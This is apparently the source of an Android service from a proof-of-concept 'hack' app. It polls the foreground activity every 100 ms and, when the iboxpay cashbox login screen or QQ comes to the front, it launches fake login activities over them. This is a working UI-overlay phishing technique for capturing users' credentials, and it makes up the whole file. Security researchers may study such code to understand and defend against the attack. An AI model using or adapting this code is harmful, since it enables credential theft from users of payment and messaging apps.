package com.iboxpay.hackandroid;

import android.app.ActivityManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.List;

public class HackService extends Service {
    private static final String TAG = "Hack";
    private boolean hasStart = false;

    HashMap<String, Class<?>> mProcessToHack = new HashMap<String, Class<?>>();


    Handler handler = new Handler();


    Runnable mTask = new Runnable() {


        @Override

        public void run() {

            ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            String runningActivityPackageName;
            int sdkVersion;
            try {
                sdkVersion = Integer.valueOf(android.os.Build.VERSION.SDK);
            } catch (NumberFormatException e) {
                sdkVersion = 0;
            }
            if (sdkVersion >= 21) {//获取系统api版本号,如果是5x系统就用这个方法获取当前运行的包名
                runningActivityPackageName = getCurrentPkgName(HackService.this);
            } else {
                runningActivityPackageName = activityManager.getRunningTasks(1).get(0).topActivity.getPackageName();
            }
            runningActivityPackageName = activityManager.getRunningTasks(1).get(0).topActivity.getClassName();
            if (mProcessToHack.containsKey(runningActivityPackageName)) {
                hack(runningActivityPackageName);
            }


            handler.postDelayed(mTask, 100);

        }


        private void hack(String activityName) {
            if (!((HackApplication) getApplication()).isHacked(activityName)) {


                Intent hackIntent = new Intent(getBaseContext(),

                        mProcessToHack.get(activityName));

                hackIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                getApplication().startActivity(hackIntent);

                ((HackApplication) getApplication()).add(activityName);
            }
        }
    };


    public HackService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        if (!hasStart) {

            mProcessToHack.put("com.iboxpay.minicashbox.LoginActivity",

                    FakeCashboxLoginActivity.class);

            mProcessToHack.put("com.tencent.mobileqq", FakeLoginActivity.class);

            handler.postDelayed(mTask, 100);

            hasStart = true;

        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        hasStart = false;

        Log.w(TAG, "劫持服务停止");

        ((HackApplication) getApplication()).clear();
    }


    public static String getCurrentPkgName(Context context) {//5x系统以后利用反射获取当前栈顶activity的包名.
        ActivityManager.RunningAppProcessInfo currentInfo = null;
        Field field = null;
        int START_TASK_TO_FRONT = 2;
        String pkgName = null;
        try {
            field = ActivityManager.RunningAppProcessInfo.class.getDeclaredField("processState");//通过反射获取进程状态字段.
        } catch (Exception e) {
            e.printStackTrace();
        }
        ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        List appList = am.getRunningAppProcesses();
        ActivityManager.RunningAppProcessInfo app;
        for (int i = 0; i < appList.size(); i++) {
            //ActivityManager.RunningAppProcessInfo app : appList
            app = (ActivityManager.RunningAppProcessInfo) appList.get(i);
            if (app.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {//表示前台运行进程.
                Integer state = null;
                try {
                    state = field.getInt(app);//反射调用字段值的方法,获取该进程的状态.
                } catch (Exception e) {
                    e.printStackTrace();
                }
                if (state != null && state == START_TASK_TO_FRONT) {//根据这个判断条件从前台中获取当前切换的进程对象.
                    currentInfo = app;
                    break;
                }
            }
        }
        if (currentInfo != null) {
            pkgName = currentInfo.processName;
        }
        return pkgName;
    }
}
